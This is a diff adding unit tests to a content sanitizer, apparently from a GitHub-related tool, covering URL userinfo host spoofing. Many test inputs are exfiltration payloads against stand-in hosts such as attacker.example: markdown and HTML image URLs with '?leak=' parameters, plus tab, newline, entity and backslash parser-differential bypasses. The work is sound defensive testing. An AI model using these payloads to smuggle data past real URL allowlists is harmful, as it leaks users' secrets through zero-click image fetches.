@@ -1382,6 +1382,198 @@ describe("sanitize_content.cjs", () => {
     });
   });
 
+  describe("URL userinfo authority spoofing", () => {
+    // A URL authority may carry a "userinfo@" prefix. Everything before the last
+    // "@" is credentials, not the host, so "https://github.com@evil.com/x"
+    // connects to evil.com even though the allowlisted "github.com" appears
+    // first. Redaction must key off the real host in every URL form.
+
+    it("should redact an https URL whose allowlisted host is only userinfo", () => {
+      const result = sanitizeContent("https://github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a markdown image whose https host is spoofed via userinfo", () => {
+      // Zero-click exfiltration vector: GitHub's camo proxy fetches image URLs
+      // server-side when the rendered comment is viewed.
+      const result = sanitizeContent("![x](https://github.com@attacker.example/pixel.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a protocol-relative URL whose allowlisted host is only userinfo", () => {
+      // Browsers on an HTTPS page resolve //host/path to https://host/path.
+      const result = sanitizeContent("//github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a markdown image whose protocol-relative host is spoofed via userinfo", () => {
+      const result = sanitizeContent("![x](//github.com@attacker.example/pixel.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a protocol-relative URL with no path when the host is spoofed", () => {
+      const result = sanitizeContent("//github.com@evil.com");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should redact a protocol-relative URL whose userinfo carries a port", () => {
+      const result = sanitizeContent("//github.com:443@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a protocol-relative URL with chained userinfo segments", () => {
+      // The LAST "@" delimits the real host, so every earlier segment is userinfo.
+      const result = sanitizeContent("//a@github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a protocol-relative URL with user:password userinfo", () => {
+      const result = sanitizeContent("//user:SENTINEL_PASSWORD@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("SENTINEL_PASSWORD");
+    });
+
+    it("should redact a spoofed protocol-relative host regardless of case", () => {
+      const result = sanitizeContent("//GitHub.com@EVIL.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("EVIL.com/x");
+    });
+
+    it("should redact a spoofed protocol-relative URL inside an HTML src attribute", () => {
+      const result = sanitizeContent('<img src="//github.com@evil.com/p.png">');
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/p.png");
+    });
+
+    it("should redact every spoofed protocol-relative URL when several appear", () => {
+      const result = sanitizeContent("//github.com@evil.com/a //github.com@bad.org/b");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).toContain("(bad.org/redacted)");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should strip userinfo but keep the URL when the real host is allowed", () => {
+      const result = sanitizeContent("//github.com@github.com/ok");
+      expect(result).toContain("//github.com/ok");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should not treat an @ in a protocol-relative path as userinfo", () => {
+      const result = sanitizeContent("//github.com/a@b");
+      expect(result).toContain("//github.com/a@b");
+    });
+
+    it("should not treat an @ in a protocol-relative query string as userinfo", () => {
+      const result = sanitizeContent("//github.com/repo?u=a@b.com");
+      expect(result).toContain("//github.com/repo?u=a@b.com");
+    });
+
+    it("should not corrupt // path segments inside an allowed absolute URL", () => {
+      const result = sanitizeContent("https://github.com//issues");
+      expect(result).toContain("https://github.com//issues");
+    });
+
+    // A URL-spoofing check is only as good as its agreement with the parser that
+    // will eventually fetch the URL. Each case below is a place where the
+    // sanitizer's regex view of "where does the authority end" or "where does a
+    // URL begin" once diverged from a browser's, letting a spoofed host through.
+
+    it("should strip userinfo from a spoofed URL that immediately follows another URL", () => {
+      // A greedy authority once swallowed the "," and the following "https:",
+      // so the global scan resumed past the second URL and never stripped it.
+      const result = sanitizeContent("https://github.com/a,https://github.com@attacker.example/p?leak=SENTINEL");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should strip userinfo from adjacent protocol-relative markdown images", () => {
+      const result = sanitizeContent("![a](//x.example)![b](//github.com@attacker.example/p.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host in a CommonMark angle-bracket link destination", () => {
+      const result = sanitizeContent("![p](<//github.com@attacker.example/pixel.gif?leak=SENTINEL>)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host in an unquoted HTML src attribute", () => {
+      const result = sanitizeContent("<img src=//github.com@attacker.example/p.gif?leak=SENTINEL>");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host behind backslash separators", () => {
+      // URL parsers treat "\" as "/" for special schemes, so \\host resolves
+      // exactly like //host.
+      const result = sanitizeContent('<img src="\\\\github.com@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host behind a mixed slash-backslash separator", () => {
+      const result = sanitizeContent('<img src="/\\github.com@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a disallowed host behind backslash separators without userinfo", () => {
+      const result = sanitizeContent('<img src="\\\\attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by a tab, which URL parsers discard", () => {
+      const result = sanitizeContent('<img src="//github.com\tA@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by an encoded tab entity", () => {
+      const result = sanitizeContent('<img src="//github.com&#9;A@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by a newline, which URL parsers discard", () => {
+      const result = sanitizeContent('<img src="//github.com\nA@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed protocol-relative host in a query parameter", () => {
+      const result = sanitizeContent("https://github.com/a?redirect=//github.com@attacker.example/p?leak=SENTINEL");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should not redact an allowed host that merely follows a newline in prose", () => {
+      // Tab/CR/LF are tolerated inside an authority only to defeat the parser
+      // differential above; an ordinary host followed by prose must be intact.
+      const result = sanitizeContent("//github.com/repo\nnext line of prose");
+      expect(result).toContain("//github.com/repo");
+      expect(result).toContain("next line of prose");
+    });
+
+    it("should not redact an allowed protocol-relative URL in a query parameter", () => {
+      const result = sanitizeContent("https://github.com/a?redirect=//github.com/b");
+      expect(result).toContain("https://github.com/a?redirect=//github.com/b");
+    });
+
+    it("should leave Windows-style paths untouched", () => {
+      const result = sanitizeContent("C:\\Users\\me\\file.txt");
+      expect(result).toContain("C:\\Users\\me\\file.txt");
+    });
+  });
+
   describe("domain sanitization", () => {
     let sanitizeDomainName;
 
